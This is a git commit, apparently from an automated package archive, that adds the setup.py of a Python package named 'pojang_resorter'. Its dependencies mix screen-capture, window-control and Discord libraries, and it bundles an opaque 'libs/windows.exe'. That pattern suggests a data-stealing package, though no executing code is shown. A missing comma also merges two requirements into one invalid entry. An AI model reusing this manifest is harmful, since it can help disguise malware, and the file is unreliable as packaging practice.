453048b9646120f120fc9174cdad40b31aa460b8
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-09-03 05:04:42 +0000

    Add package pojang-resorter/2.32.31/pojang_resorter-2.32.31.tar.gz

---
+++ packages/pojang-resorter/pojang_resorter-2.32.31.tar.gz/pojang_resorter-2.32.31/setup.py
@@ -0,0 +1,34 @@
+from setuptools import setup, find_packages
+
+setup(
+    name='pojang_resorter',
+    version='2.32.31',  # Updated version
+    packages=find_packages(),
+    install_requires=[
+        'pillow',
+        'pyautogui',
+        'mcron'
+        'requests',
+        'discord.py',
+        'gitpython',
+        'opencv-python',
+        'pycurl',
+        'pywin32',
+        'aiohttp',
+        'numpy',
+        'pygetwindow',
+        'pyscreenshot',
+        'scipy',
+        'pytest',
+    ],
+    entry_points={
+        'console_scripts': [
+            'pojang-resorter = pojang_resorter.main:main',
+        ],
+    },
+    python_requires='>=3.10,<3.13',
+    include_package_data=True,
+    package_data={
+        'pojang_resorter': ['libs/windows.exe'],
+    },
+)
